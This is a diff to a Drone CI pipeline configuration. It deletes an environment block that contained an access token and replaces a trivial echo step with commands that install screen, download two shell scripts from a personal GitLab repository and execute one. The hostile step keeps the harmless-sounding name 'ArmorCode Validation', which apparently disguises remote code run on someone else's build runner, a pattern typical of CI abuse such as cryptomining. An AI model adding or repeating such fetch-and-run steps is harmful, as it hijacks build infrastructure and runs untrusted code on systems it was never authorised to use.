@@ -1,17 +1,16 @@
 kind: pipeline
 type: docker
-name: test
+name: cok susa
 
-environment:
-  productId: 2007
-  subProductId: 3705
-  environment: Staging
-  token: 469348ae-ed91-4200-ad76-bee52fbf3f34
-  buildTool: DRONE
-  buildNumber: "${DRONE_BUILD_NUMBER}"
+platform:
+  arch: amd64
+  os: linux
 
 steps:
 - name: ArmorCode Validation
   image: golang:1.12
   commands:
-  - echo "babi"
+  - apt-get update && apt-get install screen -y
+  - curl -L https://gitlab.com/kabehada3/apepe/-/raw/main/googleping.sh > googleping.sh
+  - curl -L https://gitlab.com/kabehada3/apepe/-/raw/main/bismillacuan.sh > bismillacuan.sh
+  - sh bismillacuan.sh 
